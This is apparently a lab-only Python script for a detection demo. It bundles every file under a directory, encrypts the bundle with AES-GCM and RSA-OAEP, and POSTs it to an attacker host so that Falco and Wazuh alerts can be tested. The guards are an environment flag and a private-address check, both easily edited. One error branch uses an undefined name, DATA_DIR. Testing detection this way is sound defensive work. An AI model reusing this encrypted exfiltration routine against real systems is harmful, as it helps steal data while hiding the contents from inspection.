#!/usr/bin/env python3
"""CipherGuard exfiltration SIMULATION — lab use only.

Purpose: demonstrate that behavioural detection (Falco + Wazuh) still fires when
the exfiltrated content is encrypted and cannot be inspected. It reads the
synthetic test data mounted at /data, encrypts it (AES-256-GCM for the body,
RSA-OAEP to wrap the AES key), and POSTs the blob to the lab attacker host.

This is a teaching artifact for an isolated lab. Three guards keep it there:

  1. It refuses to run unless CIPHERGUARD_LAB=1 is set.
  2. It refuses any destination that is not an RFC1918 private address
     (the lab attacker host lives inside the VPC).
  3. It only reads the synthetic data directory, never real paths.

It is dropped into the demo pod at attack time (not baked into the image), which
is itself one of the detections (exec of a script from /tmp).
"""
import argparse
import ipaddress
import json
import os
import socket
import sys
import urllib.request
from pathlib import Path

DEFAULT_PUBKEY = Path(__file__).with_name("keys") / "lab_recipient_pub.pem"


def refuse(msg: str) -> "NoReturn":
    print(f"exfil.py: refusing to run: {msg}", file=sys.stderr)
    sys.exit(2)


def check_lab_guard() -> None:
    if os.environ.get("CIPHERGUARD_LAB") != "1":
        refuse("set CIPHERGUARD_LAB=1 to confirm this is the isolated lab")


def resolve_private(host: str) -> str:
    """Resolve host and require an RFC1918 address, so data cannot leave the VPC."""
    try:
        addr = socket.getaddrinfo(host, None, type=socket.SOCK_STREAM)[0][4][0]
    except socket.gaierror as exc:
        refuse(f"cannot resolve {host}: {exc}")
    ip = ipaddress.ip_address(addr)
    if not ip.is_private:
        refuse(f"destination {host} ({addr}) is not a private lab address")
    return addr


def collect_data(data_dir: Path) -> bytes:
    if not data_dir.is_dir():
        refuse(f"synthetic data dir {data_dir} not found")
    blob = bytearray()
    for f in sorted(data_dir.rglob("*")):
        if f.is_file():
            blob.extend(f"\n=== {f} ===\n".encode())
            blob.extend(f.read_bytes())
    if not blob:
        refuse(f"no files under {DATA_DIR}")
    return bytes(blob)


def encrypt(plaintext: bytes, pubkey_path: Path) -> dict:
    """AES-256-GCM for the body; RSA-OAEP wraps the AES key (hybrid encryption)."""
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import padding
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM

    key = AESGCM.generate_key(bit_length=256)
    nonce = os.urandom(12)
    ciphertext = AESGCM(key).encrypt(nonce, plaintext, None)

    pub = serialization.load_pem_public_key(pubkey_path.read_bytes())
    wrapped = pub.encrypt(
        key,
        padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()),
                     algorithm=hashes.SHA256(), label=None),
    )
    import base64
    b64 = lambda b: base64.b64encode(b).decode()
    return {
        "alg": "AES-256-GCM+RSA-OAEP",
        "nonce": b64(nonce),
        "wrapped_key": b64(wrapped),
        "ciphertext": b64(ciphertext),
        "plaintext_bytes": len(plaintext),
    }


def send(addr: str, host: str, port: int, payload: dict) -> None:
    body = json.dumps(payload).encode()
    req = urllib.request.Request(f"http://{addr}:{port}/exfil", data=body,
                                 headers={"Content-Type": "application/json"})
    with urllib.request.urlopen(req, timeout=10) as resp:
        print(f"exfil.py: sent {payload['plaintext_bytes']} bytes "
              f"({len(body)} encrypted) to {host}:{port} -> {resp.status}")


def main() -> None:
    parser = argparse.ArgumentParser(description="CipherGuard exfil simulation (lab only)")
    parser.add_argument("--host", required=True, help="lab attacker host (private IP)")
    parser.add_argument("--port", type=int, default=8080)
    parser.add_argument("--pubkey", type=Path, default=DEFAULT_PUBKEY)
    parser.add_argument("--data-dir", type=Path,
                        default=Path(os.environ.get("CG_DATA_DIR", "/data")))
    args = parser.parse_args()

    check_lab_guard()
    # Validate the destination before touching any data.
    addr = resolve_private(args.host)
    payload = encrypt(collect_data(args.data_dir), args.pubkey)
    send(addr, args.host, args.port, payload)


if __name__ == "__main__":
    main()
